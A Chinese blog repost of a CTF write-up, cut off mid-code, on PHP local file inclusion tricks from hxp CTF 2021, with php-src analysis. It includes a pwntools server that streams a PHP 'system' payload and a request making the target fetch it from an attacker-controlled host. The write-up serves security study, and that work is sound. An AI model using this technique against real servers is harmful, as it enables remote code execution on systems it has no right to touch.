<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>A New Novel LFI | cheng_xing's blog</title><meta name="robots" content="noindex"><meta name="author" content="cheng_xing"><meta name="copyright" content="cheng_xing"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="A New Novel LFI 作者：@Zedd     TL;DR Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件 通过多重链接绕过 PHP LFI stat 限制完成 LFI  本文主要介绍 hxp CTF 2021 中的两种新的 LFI 方法，第一部分主要介绍第一种方法，主要分析 Nginx 部分源码；第二部分简略介绍第二种方法。 Includer">
<meta property="og:type" content="article">
<meta property="og:title" content="A New Novel LFI">
<meta property="og:url" content="https://sakuraraindrop.github.io/2025/09/04/A%20New%20Novel%20LFI/index.html">
<meta property="og:site_name" content="cheng_xing&#39;s blog">
<meta property="og:description" content="A New Novel LFI 作者：@Zedd     TL;DR Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件 通过多重链接绕过 PHP LFI stat 限制完成 LFI  本文主要介绍 hxp CTF 2021 中的两种新的 LFI 方法，第一部分主要介绍第一种方法，主要分析 Nginx 部分源码；第二部分简略介绍第二种方法。 Includer">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://sakuraraindrop.github.io/img/ltx.jpg">
<meta property="article:published_time" content="2025-09-04T13:15:14.000Z">
<meta property="article:modified_time" content="2025-09-30T11:01:46.156Z">
<meta property="article:author" content="cheng_xing">
<meta property="article:tag" content="include">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakuraraindrop.github.io/img/ltx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "A New Novel LFI",
  "url": "https://sakuraraindrop.github.io/2025/09/04/A%20New%20Novel%20LFI/",
  "image": "https://sakuraraindrop.github.io/img/ltx.jpg",
  "datePublished": "2025-09-04T13:15:14.000Z",
  "dateModified": "2025-09-30T11:01:46.156Z",
  "author": [
    {
      "@type": "Person",
      "name": "cheng_xing",
      "url": "https://sakuraraindrop.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/ltx-icon.jpg"><link rel="canonical" href="https://sakuraraindrop.github.io/2025/09/04/A%20New%20Novel%20LFI/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'A New Novel LFI',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/hk.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hk.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ltx-icon.jpg" alt="Logo"><span class="site-name">cheng_xing's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">A New Novel LFI</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">A New Novel LFI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-04T13:15:14.000Z" title="发表于 2025-09-04 21:15:14">2025-09-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-30T11:01:46.156Z" title="更新于 2025-09-30 19:01:46">2025-09-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A5%BD%E6%96%87%E8%BD%AC%E8%BD%BD/">好文转载</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="A-New-Novel-LFI"><a href="#A-New-Novel-LFI" class="headerlink" title="A New Novel LFI"></a>A New Novel LFI</h1><blockquote>
<p>作者：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1384">@Zedd</a>  </p>
</blockquote>
<hr>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件</li>
<li>通过多重链接绕过 PHP LFI stat 限制完成 LFI</li>
</ul>
<p>本文主要介绍 hxp CTF 2021 中的两种新的 LFI 方法，第一部分主要介绍第一种方法，主要分析 Nginx 部分源码；第二部分简略介绍第二种方法。</p>
<h2 id="Includer’s-revenge-Nginx-Fastcgi-Temp-LFI"><a href="#Includer’s-revenge-Nginx-Fastcgi-Temp-LFI" class="headerlink" title="Includer’s revenge - Nginx Fastcgi Temp LFI"></a>Includer’s revenge - Nginx Fastcgi Temp LFI</h2><p>题目代码比较简单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;read&#x27;</span> ) === <span class="string">&#x27;read&#x27;</span> ? <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>) : <span class="keyword">include_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>可以说是 onelinephp 了，当然如果光看这些代码，我们可以直接用 36c3 hxp CTF includer 的解法解掉，用 <code>compress.zip://http://</code> 产生临时文件，包含即可，这里先回顾一下这题</p>
<p>题目给出源代码以及部署文件，源代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$rand_dir</span> = <span class="string">&#x27;files/&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>));</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="variable">$rand_dir</span>) || <span class="keyword">die</span>(<span class="string">&#x27;mkdir&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;TMPDIR=&#x27;</span>.<span class="keyword">__DIR__</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$rand_dir</span>) || <span class="keyword">die</span>(<span class="string">&#x27;putenv&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27; your sandbox: &#x27;</span>.<span class="variable">$rand_dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$rand_dir</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中配置文件有一个比较明显的配置错误：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known &#123;</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启了列目录并且我们可以遍历到上层文件夹。</p>
<p>一开始我看到这个没有 <code>&lt;?</code> 的形式，我想到的是p牛博客里面有关死亡 exit 的内容，奈何原文用的是 <code>file_put_content</code>，我们这里用的是 <code>file_get_contents</code>，并且这里的判断也在使用了 <code>file_get_contents</code> 函数之后进行判断是否有 <code>&lt;?</code>，所以这里的编码绕过就不太可能了。</p>
<p>而且这里最奇怪的就是之前用了一些看似无关紧要的代码，比如使用了 <code>putenv()</code> 函数等，给了我们一个 sandbox ，然而我们似乎无法利用表面的代码进行文件上传啥的操作。</p>
<p>balsn 队伍在公开的 wp 中写了比较详细的源码分析，这里我就配合其中的 wp 进行一下简单的分析。</p>
<p>首先直接给出结论，我们可以使用 <code>compress.zip://</code> 流进行上传任意文件，接着我们来看看相关原理。</p>
<p>在 <a target="_blank" rel="noopener" href="https://github.com/php/php-src">php-src</a> 源代码中，我们可以找到该流的相关触发解析函数 <code>php_stream_gzopen</code></p>
<p>ext&#x2F;zlib&#x2F;zlib_fopen_wrapper.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php_stream *<span class="title function_">php_stream_gzopen</span><span class="params">(php_stream_wrapper *wrapper, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> options,</span></span><br><span class="line"><span class="params">                              zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (strncasecmp(<span class="string">&quot;compress.zlib://&quot;</span>, path, <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        path += <span class="number">16</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strncasecmp(<span class="string">&quot;zlib:&quot;</span>, path, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        path += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    innerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到有个标志位 <code>STREAM_WILL_CAST</code>，我们可以先看看这个标志位用来干嘛，在 <code>main/php_streams.h</code> 定义了该标志位:</p>
<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="comment"> * up working more optimally.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></table></figure>

<p>很明显，这是一个用来将 stream 转换成 <code>FILE*</code> 的标志位，在这里就与我们创建临时文件有关了。</p>
<p>接着我们跟进 <code>php_stream_open_wrapper_ex</code> 函数，该函数在 <code>main/php_streams.h</code> 中被 define 为 <code>_php_stream_open_wrapper_ex</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> options,</span><br><span class="line">        zend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (stream != <span class="literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) &#123;</span><br><span class="line">        php_stream *newstream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">                    (options &amp; STREAM_WILL_CAST)</span><br><span class="line">                        ? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<p>该函数调用了 <code>php_stream_make_seekable_rel</code>，并向其中传入了 <code>STREAM_WILL_CAST</code> 参数，我们跟进 <code>php_stream_make_seekable_rel</code> 函数，它在 <code>main/php_streams.h</code> 中被 define 为 <code>_php_stream_make_seekable</code>，继续跟进</p>
<p>main&#x2F;streams&#x2F;cast.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="type">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="type">int</span> flags STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (newstream == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> PHP_STREAM_FAILED;</span><br><span class="line">    &#125;</span><br><span class="line">    *newstream = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;seek != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *newstream = origstream;</span><br><span class="line">        <span class="keyword">return</span> PHP_STREAM_UNCHANGED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) &#123;</span><br><span class="line">        *newstream = php_stream_fopen_tmpfile();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *newstream = php_stream_temp_new();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到如果 <code>flags</code> 与 <code>PHP_STREAM_PREFER_STDIO</code> 都被设置的话，而 <code>PHP_STREAM_PREFER_STDIO</code> 在 <code>main/php_streams.h</code> 中已经被 define</p>
<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PHP_STREAM_PREFER_STDIO     1</span></span><br></pre></td></tr></table></figure>

<p>我们只需要关心 flags 的值就好了，我们只需要确定 flags 的值非零即可，根据前面的跟进我们易知 flags 的在这里非零，所以这里就调用了 <code>php_stream_fopen_tmpfile</code> 函数创建了临时文件。</p>
<p>于是我们可以做一个简单的验证，在本机上跑源代码，并用 pwntools 起一个服务用来发送一个大文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_chunk</span>(<span class="params">l, data</span>):</span><br><span class="line">    l.send(<span class="string">&#x27;&#x27;&#x27;&#123;&#125;\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(data))[<span class="number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    l = listen(<span class="number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">&#x27;&#x27;</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">    data2 = <span class="string">&#x27;&lt;?php system(&quot;/readflag&quot;); exit(); /*&#x27;</span>.ljust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    data3 = <span class="string">&#x27;c*/&#x27;</span>.rjust(<span class="number">1024</span> * <span class="number">8</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="string">&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    l.send(<span class="string">&#x27;&#x27;&#x27;HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;sending php code...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="string">&#x27;&#x27;&#x27;0\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></table></figure>

<p>这样我在本机上用 fswatch 很明显可以看到临时文件已经生成，并且文件内容就是我们发送的内容。</p>
<p>临时文件终究还是会被 php 删除掉的，如果我们要进行包含的话，就需要利用一些方法让临时文件尽可能久的留存在服务器上，这样我们才有机会去包含它。</p>
<p>所以这里是我们需要竞争的第一个点，基本上我们有两种方法让它停留比较久的时间：</p>
<ul>
<li>使用大文件传输，这样在传输的时候就会有一定的时间让我们包含到文件了。</li>
<li>使用 FTP 速度控制，大文件传输根本上还是传输速度的问题，我们可以通过一些方式限制传输速率，比较简单的也可以利用 <code>compress.zlib://ftp://</code> 形式，控制 FTP 速度即可</li>
</ul>
<p>接下来我们就要看如何来对关键地方进行绕过了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]), <span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个地方问了很多师傅，包括一血的 TokyoWesterns 的队员以及参考了主要的公开 WP，基本都是利用两个函数之间极端的时间窗进行绕过。</p>
<p>什么意思呢？也就是说，在极其理想的情况下，我们通过自己的服务先发送一段垃圾数据，这时候通过 <code>stripos</code> 的判断就是没有 PHP 代码的文件数据，接着我们利用 HTTP 长链接的形式，只要这个链接不断开，在我们绕过第一个判断之后，我们就可以发送第二段含有 PHP 代码的数据了，这样就能使 <code>include_once</code> 包含我们的代码了。</p>
<p>因为我们无法知道什么时候能绕过第一个判断，所以这里的方法只能利用竞争的形式去包含临时文件，这里是第二个我们需要竞争的点。</p>
<p>最后，要做到文件包含，自然得先知道它的文件路径，而文件路径每次都是随机的，所以我们又不得不通过某些方式去获取路径。</p>
<p>虽然我们可以直接看到题目是直接给出了路径，但是乍一看代码我们貌似只能等到全部函数结束之后才能拿到路径，然而之前我们说到的需要保留的长链接不能让我们立即得到我们的 sandbox 路径。</p>
<p>所以我们需要通过传入过大的 name 参数，导致 PHP output buffer 溢出，在保持连接的情况下获取沙箱路径，参考代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&#x27;&#x27;&#x27;file=compress.zlib://http://192.168.151.132:8080&amp;name=&#x27;&#x27;&#x27;</span>.strip() + <span class="string">&#x27;a&#x27;</span> * (<span class="number">1024</span> * <span class="number">7</span> + <span class="number">882</span>)</span><br><span class="line">    r.send(<span class="string">&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Length: 